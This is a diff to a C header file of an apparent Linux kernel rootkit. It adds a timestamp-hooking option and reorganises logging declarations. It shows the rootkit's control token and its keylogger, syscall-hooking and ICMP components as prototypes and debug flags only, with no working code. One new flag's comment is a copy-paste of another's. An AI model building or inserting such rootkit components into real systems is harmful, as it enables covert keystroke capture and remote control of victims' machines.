@@ -17,8 +17,9 @@
 #define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
 #define __DEBUG__ 1             // General debugging statements
 #define __DEBUG_HOOK__ 0        // Debugging of inline function hooking
-#define __DEBUG_KEY__ 1         // Debugging of user keypresses
+#define __DEBUG_KEY__ 0         // Debugging of user keypresses
 #define __DEBUG_RW__ 1          // Debugging of sys_read and sys_write hooks
+#define __DEBUG_TS__ 1          // Debugging of sys_read and sys_write hooks
 
 #if __DEBUG__
 # define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
@@ -72,6 +73,9 @@ void keylogger_exit(void);
 #endif
 
 #if defined(_CONFIG_HOOKRW_)
+void log_fd_ts(char *, struct timespec *ts);
+void log_fd_info(int fd);
+void log_crypto_hash(const char*, int);
 void hookrw_init(void);
 void hookrw_exit(void);
 #endif
@@ -87,6 +91,7 @@ void icmp_init (void);
 void icmp_exit (void);
 #endif
 
-void log_fd_ts(char *, struct timespec *ts);
-void log_fd_info(int fd);
-void log_crypto_hash(const char*, int);
+#if defined(_CONFIG_HOOKTS_)
+void hookts_init(void);
+void hookts_exit(void);
+#endif
